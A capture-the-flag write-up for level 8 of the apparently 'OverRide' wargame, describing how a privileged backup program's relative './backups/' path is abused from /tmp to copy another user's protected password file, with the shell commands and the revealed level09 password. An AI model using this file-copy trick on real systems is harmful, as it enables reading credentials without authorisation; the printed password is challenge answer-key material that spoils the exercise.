# Level08

## Analysis

At first glance, this program seems to copy the content of the file specified in `argv[1]` in a second file located in the `backups/` folder.

To do that, it proceeds as follows:

- First it opens a log file `./backups/.log` using `fopen()`.
- It then opens a second stream, read only, this time from the path we passed in `argv[1]`
- Last stream, which will be the copy destination of the file we specified using `argv[1]` will be located at `./backups/ + argv[1]`

## Exploit

If we try to use the program anywhere, it will fail to open the file located at `./backups/ + argv[1]`, however we cannot just create the path inside `./backups` since we don't have the rights to create files in `~/`.

Which leads us to moving to somewhere we can write to, for example `/tmp`.

After that we will only have to create a file architecture inside backups that resembles the one we want to read from !

<details>
  <summary>Spoiler</summary>

Here are the preparations:

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ touch backups/.log
```

After that, we can simply ask it nicely:

```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass 
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

</details>


